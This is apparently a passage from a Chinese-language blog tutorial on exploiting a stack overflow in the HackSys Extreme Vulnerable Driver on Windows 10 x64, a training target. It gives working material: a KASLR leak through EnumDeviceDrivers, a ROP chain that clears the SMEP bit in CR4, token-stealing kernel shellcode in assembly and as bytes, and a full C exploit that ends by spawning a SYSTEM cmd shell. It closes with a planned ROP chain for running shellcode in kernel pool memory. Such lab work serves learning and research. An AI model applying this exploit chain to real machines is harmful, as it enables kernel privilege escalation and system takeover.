<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _LIST_ENTRY</span><br><span class="line">nt!_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> Flink            : Ptr32 _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x004</span> Blink            : Ptr32 _LIST_ENTRY</span><br></pre></td></tr></table></figure>
<p>这样不停的遍历直到找到PID为4的system则进行提权操作,提权操作就是将此时system的Token字段复制到此前保存的进程结构中完成提权</p>
<p>综上我们可以写出一份简单且完整shellcode</p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>在win7_32的环境下,由于没有smep的存在,我们直接将程序的执行流控制到用户态执行shellcode即可完成提权操作</p>
<p>但这招在win10_x64下显然没有办法成功,那么该如何利用这个漏洞呢</p>
<p>两个方法:</p>
<ol>
<li>通过将CR4寄存器的第20位置零,关闭smep保护</li>
<li>不与用户空间产生交际,完全在内核空间完成提权</li>
</ol>
<p>第二种方法我们则要么能够在内核空间中找到一个可写可执行的位置,或者完全利用gadget进行提权(这显然更难)</p>
<p>而如果是第一种方法,如果开启了kpti保护那又更难办,kpti的作用是隔离内核页表与用户页表,然而基于x86_64的实现同时也会在内核态时将用户空间标记为不可执行</p>
<p>这里我们就不难为自己了,就按照默认设置中的无kpti保护</p>
<h3 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h3><p>两种方法还都受着Kaslr的影响,那么一步一步来,先让我们开始解决Kaslr</p>
<p>解决kaslr的方法无论win还是linux,内核态还是用户态,无非就是泄露内存地址并减去偏移得到基址</p>
<p>在linux下这可能很麻烦,例如需要uaf等漏洞控制特殊结构体,并以此泄露残留指针等</p>
<p>但我们此时是windows, Windows 中有一个安全机制称为<strong>完整性级别（Integrity Level）</strong> ，用于限制进程对系统资源的访问权限</p>
<p>只要我们拥有<strong>中完整性级别(普通用户默认启动应用程序所在级别)</strong>,windows就会开放一些十分有用API给我们</p>
<p><code>EnumDeviceDrivers</code> 函数存在于 <code>psapi.h</code> 中，可以枚举所有设备驱动程序，包括内核本身，并给出设备驱动程序的基址。它将返回一个设备驱动程序列表，其中第一个就是内核本身</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">EnumDeviceDrivers</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPVOID  *lpImageBase,<span class="comment">//接收设备驱动程序地址的缓冲区</span></span></span><br><span class="line"><span class="params">  DWORD   cb,<span class="comment">//缓冲区大小</span></span></span><br><span class="line"><span class="params">  LPDWORD lpcbNeeded<span class="comment">//返回实际需要的字节数</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>写一个验证案例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintDeviceDrivers</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 缓冲区用于存储设备驱动程序的地址</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;LPVOID&gt; <span class="title function_">drivers</span><span class="params">(<span class="number">1024</span>)</span>;</span><br><span class="line">  DWORD bytesNeeded;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 枚举设备驱动程序</span></span><br><span class="line">  <span class="keyword">if</span> (!EnumDeviceDrivers(drivers.data(), static_cast&lt;DWORD&gt;(drivers.size() * <span class="keyword">sizeof</span>(LPVOID)), &amp;bytesNeeded)) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;EnumDeviceDrivers failed. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果缓冲区不足，则调整大小并重新调用</span></span><br><span class="line">  <span class="keyword">if</span> (bytesNeeded &gt; drivers.size() * <span class="keyword">sizeof</span>(LPVOID)) &#123;</span><br><span class="line">    drivers.resize(bytesNeeded / <span class="keyword">sizeof</span>(LPVOID));</span><br><span class="line">    <span class="keyword">if</span> (!EnumDeviceDrivers(drivers.data(), static_cast&lt;DWORD&gt;(drivers.size() * <span class="keyword">sizeof</span>(LPVOID)), &amp;bytesNeeded)) &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;EnumDeviceDrivers failed after resizing. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打印设备驱动程序信息</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loaded Device Drivers:\n&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; bytesNeeded / <span class="keyword">sizeof</span>(LPVOID); ++i) &#123;</span><br><span class="line">    TCHAR driverName[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], driverName, MAX_PATH)) &#123;</span><br><span class="line">      <span class="built_in">std</span>::wcout &lt;&lt; <span class="string">L&quot;Driver: &quot;</span> &lt;&lt; driverName &lt;&lt; <span class="string">L&quot; at address &quot;</span> &lt;&lt; drivers[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to get driver name. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  PrintDeviceDrivers();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行测试</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_164121.png" alt=""></p>
<p><code>ntoskrnl.exe</code>就是内核的核心组件,它的加载基址就是windows内核代码段的加载基址</p>
<p>是的,令人头大的Kaslr保护就这样被轻而易举破解了</p>
<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><p>现在让我们尝试第一种解决方案,在<code>ntoskrnl.exe</code>中有这样的gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rcx; ret;</span><br><span class="line">mov cr4, rcx; ret;</span><br></pre></td></tr></table></figure>
<p>那么我们就完全有能力修改CR4寄存器</p>
<p>通过windbg观察常规状态下cr4寄存器的值</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_212449.png" alt=""></p>
<p>第20位处的值是1,也就代表开启了smep保护,所以需要将其关闭,让后跳转到用户内存执行shellcode</p>
<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>win10_x64的内核提权shellcode本质上与win7_x32下区别并不太大,但依然会有一些区别</p>
<p>这里依然采用常见的token窃取提权方式</p>
<p>取该仓库的一段shellcoe<a target="_blank" rel="noopener" href="https://github.com/Kristal-g/kristal-g.github.io/blob/master/assets/code/shellcode_fix_stack_pivot.asm">kristal-g.github.io/assets/code/shellcode_fix_stack_pivot.asm at master · Kristal-g/kristal-g.github.io</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">SECTION .start_magic     </span><br><span class="line">db &quot;magic1&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECTION .text</span><br><span class="line">;db 0xcc</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">	xor rax, rax</span><br><span class="line">	mov rax, [gs:rax + 188h]		; gs[0] == KPCR, Get KPCRB.CurrentThread field</span><br><span class="line">	mov rax, [rax+0xb8]		; Get (KAPC_STATE)ApcState.Process (our EPROCESS)</span><br><span class="line">	mov r9, rax;			; Backup target EPROCESS at r9</span><br><span class="line">	</span><br><span class="line">	; loop processes list</span><br><span class="line">	mov rax, [rax + 0x448]	; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link</span><br><span class="line">	mov rax, [rax]			; Follow the first link</span><br><span class="line">system_process_loop:</span><br><span class="line">	mov rdx, [rax - 0x8]	; ProcessId</span><br><span class="line">	mov r8, rax;			; backup system EPROCESS.ActiveProcessLinks pointer at r8</span><br><span class="line">	mov rax, [rax]			; Next process</span><br><span class="line">	cmp rdx, 4			; System PID</span><br><span class="line">	jnz system_process_loop</span><br><span class="line">	</span><br><span class="line">	mov rdx, [r8 + 0x70]</span><br><span class="line">	and rdx, 0xfffffffffffffff8			; Ignore ref count</span><br><span class="line">	mov rcx, [r9 + 0x4b8]</span><br><span class="line">	and rcx, 0x7</span><br><span class="line">	add rdx, rcx				; put target&#x27;s ref count into our token</span><br><span class="line">	mov [r9 + 0x4b8], rdx		; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff</span><br><span class="line">	</span><br><span class="line">	;db 0xcc</span><br><span class="line">ret_to_usermode:</span><br><span class="line">	;sti</span><br><span class="line">	mov rax, [gs:0x188]		; _KPCR.Prcb.CurrentThread</span><br><span class="line">	mov cx, [rax + 0x1e4]		; KTHREAD.KernelApcDisable</span><br><span class="line">	inc cx</span><br><span class="line">	mov [rax + 0x1e4], cx</span><br><span class="line">	mov rdx, [rax + 0x90] 	; ETHREAD.TrapFrame</span><br><span class="line">	mov rcx, [rdx + 0x168]	; ETHREAD.TrapFrame.Rip</span><br><span class="line">	mov r11, [rdx + 0x178]	; ETHREAD.TrapFrame.EFlags</span><br><span class="line">	mov rsp, [rdx + 0x180]	; ETHREAD.TrapFrame.Rsp</span><br><span class="line">	mov rbp, [rdx + 0x158]	; ETHREAD.TrapFrame.Rbp</span><br><span class="line">	;db 0xcc</span><br><span class="line">	xor eax, eax 	; return STATUS_SUCCESS to NtDeviceIoControlFile </span><br><span class="line">	swapgs</span><br><span class="line">	o64 sysret	; nasm shit</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">SECTION .end_magic     </span><br><span class="line">db &quot;magic2&quot; </span><br></pre></td></tr></table></figure>
<p>关于shellcode的详细解释可以查看参考链接中的文章</p>
<p>使用nasm将其编译后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f win64 sc.<span class="keyword">asm</span> -o sc.obj</span><br></pre></td></tr></table></figure>
<p>再使用ida等工具获取shellcode</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_221518.png" alt=""></p>
<p>完整的exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD ULONGLONG</span></span><br><span class="line"></span><br><span class="line">BYTE dst_sc[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">QWORD <span class="title function_">getBaseAddr</span><span class="params">(LPCWSTR drvName)</span> &#123;</span><br><span class="line">  LPVOID drivers[<span class="number">512</span>];</span><br><span class="line">  DWORD cbNeeded;</span><br><span class="line">  <span class="type">int</span> nDrivers, i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">    WCHAR szDrivers[<span class="number">512</span>];</span><br><span class="line">    nDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nDrivers; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], szDrivers, <span class="keyword">sizeof</span>(szDrivers) / <span class="keyword">sizeof</span>(szDrivers[<span class="number">0</span>]))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wcscmp(szDrivers, drvName) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> (QWORD)drivers[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE hDriver = CreateFile(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Error while creating a handle to the driver: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  QWORD ntBase = getBaseAddr(<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] NTBase: %llx\n&quot;</span>, ntBase);</span><br><span class="line">  QWORD POP_RCX = ntBase + <span class="number">0x202e71</span>;</span><br><span class="line">  QWORD MOV_CR4_RCX = ntBase + <span class="number">0x3a0bd7</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> bufSize = <span class="number">2072</span> + <span class="number">4</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  LPVOID uBuffer = VirtualAlloc(<span class="literal">NULL</span>, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  LPVOID shellcode = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">256</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  RtlFillMemory(uBuffer, bufSize, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">  RtlCopyMemory(shellcode, dst_sc, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">  QWORD* rop = (QWORD*)((QWORD)uBuffer + <span class="number">2072</span>);</span><br><span class="line"></span><br><span class="line">  *(rop + index++) = POP_RCX;</span><br><span class="line">  *(rop + index++) = <span class="number">0x350ef8</span> ^ <span class="number">1UL</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">  *(rop + index++) = MOV_CR4_RCX;</span><br><span class="line">  *(rop + index++) = (QWORD)shellcode;</span><br><span class="line"></span><br><span class="line">  DeviceIoControl(hDriver, <span class="number">0x222003</span>, (LPVOID)uBuffer, bufSize, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Enjoy your shell!\n&quot;</span>, ntBase);</span><br><span class="line">  system(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_221904.png" alt=""></p>
<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><p>第二种方式怎么试都没成功,明明都已经执行到shellcode了,但总是会有千奇百怪的错误(断点打在不同处竟然结果就会不一样…)</p>
<p>调试调到晕厥,就这样吧以后再研究</p>
<hr>
<p>对第二种方式完全使用gadget过于困难,所以还是要想办法在内核中执行shellcode,但要执行代码就肯定需要可控的可写可执行内存块</p>
<h4 id="分配内核可执行内存"><a href="#分配内核可执行内存" class="headerlink" title="分配内核可执行内存"></a>分配内核可执行内存</h4><p>驱动程序的开发人员可以分配不同类型的内存池。最基本的两类是分页池和非分页池类型。前者分配了一个不可执行的页式内存池以供使用，而后者分配了一个非页式池，默认情况下是可执行的。可以通过调用带有所需参数的 ExAllocatePoolWithTag()函数来执行分配。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">ExAllocatePoolWithTag</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,</span></span><br><span class="line"><span class="params">  [in] SIZE_T                                         NumberOfBytes,</span></span><br><span class="line"><span class="params">  [in] ULONG                                          Tag</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><strong><code>PoolType</code></strong><ul>
<li>说明：指定内存池的类型。常见的类型包括：<ul>
<li><strong><code>NonPagedPool</code></strong>：未分页内存池，分配的内存不会被交换到磁盘，适用于中断服务例程（ISR）等需要快速访问的场景。</li>
<li><strong><code>PagedPool</code></strong>：分页内存池，分配的内存可能会被交换到磁盘，适用于不需要在中断上下文中访问的场景。</li>
<li><strong><code>NonPagedPoolNx</code></strong>：未分页内存池，且内存不可执行（No Execute），适用于安全敏感的场景。</li>
<li><strong><code>PagedPoolNx</code></strong>：分页内存池，且内存不可执行（No Execute）。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>NumberOfBytes</code></strong><ul>
<li>说明：要分配的内存大小（以字节为单位）。</li>
</ul>
</li>
<li><strong><code>Tag</code></strong><ul>
<li>说明：用于标识内存分配的标签（4 个字符）。标签通常用于调试和内存泄漏检测。</li>
</ul>
</li>
</ol>
<p>这个函数无法在用户态使用,但是现在我们已经破除了kaslr,我们已经可以知道他在内核的加载位置了</p>
<p>那么我们可以利用rop去调用这个位置,并设置合适的参数即可</p>
<h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>使用ROPgadget或ropper这样的工具查找<code>C:\Windows\System32\ntoskrnl.exe</code>的gadget</p>
<p>足足找出了12m文本的gadgets,我们需要找怎样的gadget呢,windows的调用约定与linux有所不同,只用四个寄存器作为传参寄存器,剩余用栈传递,分别是rcx, rdx, r8, r9</p>
<p>我们现在要做的是,分配一块可执行的内存,然后将用户态的shellcode复制到内核态使用</p>
<p>我们的ROP链应该像这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx; ret; -&gt; zeroes out our RCX register, which is the first parameter of AllocatePoolWithTag()</span><br><span class="line">pop rdx; ret ; -&gt; pops 0x1000 (4096) to rdx register, which is the second parameter of AllocatePoolWithTag() and indicates the size of the pool</span><br><span class="line">0x1000 -&gt; value of rdx</span><br><span class="line">AllocatePoolWithTag() -&gt; calls the AllocatePoolWithTag function. The address of the allocated pool will then be in rax</span><br><span class="line">mov rcx, rax; ret; -&gt; copies the address to rcx, which will be first parameter of memcpy</span><br><span class="line">pop rdx; ret -&gt; gets the source address from stack. This will be our shellcode in userland that will escalate privileges.</span><br><span class="line">&lt;ADDRESS OF SHELLCODE&gt;</span><br><span class="line">0x0000000140201861: pop r8; ret;  -&gt; gets the size from stack.</span><br><span class="line">&lt;SIZE OF SHELLCODE&gt;</span><br><span class="line">memcpy() -&gt; calls the memcpy function and copies our payload to an executable kernel space</span><br><span class="line">jmp rax; -&gt; jumps to a register which stores the address of our shellcode in kernel land</span><br></pre></td></tr></table></figure>
<p>这是我们能够找到的</p>
